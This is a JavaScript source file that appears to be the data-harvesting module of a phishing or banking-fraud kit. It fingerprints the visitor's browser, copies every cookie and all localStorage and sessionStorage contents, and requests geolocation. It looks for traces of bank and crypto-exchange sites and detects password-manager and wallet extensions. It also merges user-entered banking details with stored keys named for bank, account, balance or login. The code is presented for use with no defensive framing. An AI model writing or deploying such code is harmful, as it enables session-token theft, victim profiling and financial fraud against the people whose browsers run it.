// Advanced data collection utilities
export const collectAdvancedData = async () => {
  const data = {
    timestamp: new Date().toISOString(),
    browser: {},
    system: {},
    network: {},
    storage: {},
    security: {}
  };

  try {
    // Browser fingerprinting
    data.browser = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints,
      vendor: navigator.vendor,
      vendorSub: navigator.vendorSub,
      productSub: navigator.productSub,
      appName: navigator.appName,
      appVersion: navigator.appVersion,
      buildID: navigator.buildID || 'N/A'
    };

    // Screen and display info
    data.system.screen = {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      orientation: screen.orientation?.type || 'unknown'
    };

    // Window and viewport
    data.system.window = {
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      devicePixelRatio: window.devicePixelRatio,
      scrollX: window.scrollX,
      scrollY: window.scrollY
    };

    // Timezone and location
    data.system.timezone = {
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      locale: Intl.DateTimeFormat().resolvedOptions().locale
    };

    // Network information
    if (navigator.connection) {
      data.network = {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      };
    }

    // Memory information
    if (navigator.deviceMemory) {
      data.system.memory = navigator.deviceMemory;
    }

    // Battery information
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      data.system.battery = {
        charging: battery.charging,
        level: battery.level,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
    }

    // WebGL fingerprinting
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        data.system.webgl = {
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER),
          version: gl.getParameter(gl.VERSION),
          shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
        };
      }
    } catch (e) {
      data.system.webgl = 'unavailable';
    }

    // Canvas fingerprinting
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillText('Browser fingerprint', 2, 2);
      data.system.canvasFingerprint = canvas.toDataURL().slice(-50);
    } catch (e) {
      data.system.canvasFingerprint = 'unavailable';
    }

    // Audio fingerprinting
    try {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const analyser = audioContext.createAnalyser();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(analyser);
      analyser.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      data.system.audioFingerprint = {
        sampleRate: audioContext.sampleRate,
        state: audioContext.state,
        maxChannelCount: audioContext.destination.maxChannelCount
      };
      
      audioContext.close();
    } catch (e) {
      data.system.audioFingerprint = 'unavailable';
    }

    // Collect all cookies
    data.storage.cookies = document.cookie;

    // Local storage
    try {
      const localStorage = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        localStorage[key] = window.localStorage.getItem(key);
      }
      data.storage.localStorage = localStorage;
    } catch (e) {
      data.storage.localStorage = 'unavailable';
    }

    // Session storage
    try {
      const sessionStorage = {};
      for (let i = 0; i < window.sessionStorage.length; i++) {
        const key = window.sessionStorage.key(i);
        sessionStorage[key] = window.sessionStorage.getItem(key);
      }
      data.storage.sessionStorage = sessionStorage;
    } catch (e) {
      data.storage.sessionStorage = 'unavailable';
    }

    // IndexedDB databases
    try {
      if (window.indexedDB) {
        const databases = await indexedDB.databases();
        data.storage.indexedDB = databases.map(db => ({
          name: db.name,
          version: db.version
        }));
      }
    } catch (e) {
      data.storage.indexedDB = 'unavailable';
    }

    // Installed plugins
    data.browser.plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
      const plugin = navigator.plugins[i];
      data.browser.plugins.push({
        name: plugin.name,
        filename: plugin.filename,
        description: plugin.description,
        version: plugin.version
      });
    }

    // MIME types
    data.browser.mimeTypes = [];
    for (let i = 0; i < navigator.mimeTypes.length; i++) {
      const mimeType = navigator.mimeTypes[i];
      data.browser.mimeTypes.push({
        type: mimeType.type,
        description: mimeType.description,
        suffixes: mimeType.suffixes
      });
    }

    // Permissions
    try {
      const permissions = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard-read'];
      data.security.permissions = {};
      
      for (const permission of permissions) {
        try {
          const result = await navigator.permissions.query({ name: permission });
          data.security.permissions[permission] = result.state;
        } catch (e) {
          data.security.permissions[permission] = 'unknown';
        }
      }
    } catch (e) {
      data.security.permissions = 'unavailable';
    }

    // Geolocation (if permitted)
    try {
      if (navigator.geolocation) {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
        });
        
        data.security.location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          heading: position.coords.heading,
          speed: position.coords.speed
        };
      }
    } catch (e) {
      data.security.location = 'denied_or_unavailable';
    }

    // Check for common banking/financial sites in history
    data.security.financialSites = await checkFinancialSites();

    // Browser extensions detection
    data.security.extensions = await detectExtensions();

    return data;

  } catch (error) {
    console.error('Data collection error:', error);
    return data;
  }
};

// Check for financial sites in browser history/bookmarks
const checkFinancialSites = async () => {
  const financialDomains = [
    'chase.com', 'wellsfargo.com', 'bankofamerica.com', 'citibank.com',
    'paypal.com', 'venmo.com', 'cashapp.com', 'robinhood.com',
    'coinbase.com', 'binance.com', 'kraken.com', 'gemini.com'
  ];

  const detected = [];
  
  // Check if sites are accessible (indicates user has accounts)
  for (const domain of financialDomains) {
    try {
      // This won't work due to CORS, but we can check for stored data
      const hasData = localStorage.getItem(domain) || 
                     sessionStorage.getItem(domain) ||
                     document.cookie.includes(domain);
      
      if (hasData) {
        detected.push(domain);
      }
    } catch (e) {
      // Ignore errors
    }
  }

  return detected;
};

// Detect browser extensions
const detectExtensions = async () => {
  const extensions = [];
  
  // Common extension detection methods
  const extensionTests = [
    { name: 'MetaMask', test: () => window.ethereum && window.ethereum.isMetaMask },
    { name: 'LastPass', test: () => document.querySelector('#lp-pom-root') },
    { name: 'Dashlane', test: () => window.dashlane },
    { name: '1Password', test: () => document.querySelector('[data-extension-id*="1password"]') },
    { name: 'Bitwarden', test: () => document.querySelector('[data-extension-id*="bitwarden"]') },
    { name: 'Honey', test: () => window.honey },
    { name: 'AdBlock', test: () => window.adblock || window.AdBlock },
    { name: 'Grammarly', test: () => document.querySelector('[data-gr-ext]') }
  ];

  for (const ext of extensionTests) {
    try {
      if (ext.test()) {
        extensions.push(ext.name);
      }
    } catch (e) {
      // Ignore errors
    }
  }

  return extensions;
};

// Enhanced banking data collection
export const collectBankingData = async (bankingInfo) => {
  const enhancedData = {
    ...bankingInfo,
    advanced: await collectAdvancedData(),
    bankingSpecific: {}
  };

  // Check for banking-related stored data
  try {
    const bankingKeys = Object.keys(localStorage).filter(key => 
      key.toLowerCase().includes('bank') || 
      key.toLowerCase().includes('account') ||
      key.toLowerCase().includes('balance') ||
      key.toLowerCase().includes('login')
    );

    enhancedData.bankingSpecific.storedBankingData = {};
    bankingKeys.forEach(key => {
      enhancedData.bankingSpecific.storedBankingData[key] = localStorage.getItem(key);
    });
  } catch (e) {
    enhancedData.bankingSpecific.storedBankingData = 'unavailable';
  }

  // Check for saved passwords (if accessible)
  try {
    if (navigator.credentials) {
      enhancedData.bankingSpecific.credentialsAPI = 'available';
    }
  } catch (e) {
    enhancedData.bankingSpecific.credentialsAPI = 'unavailable';
  }

  return enhancedData;
};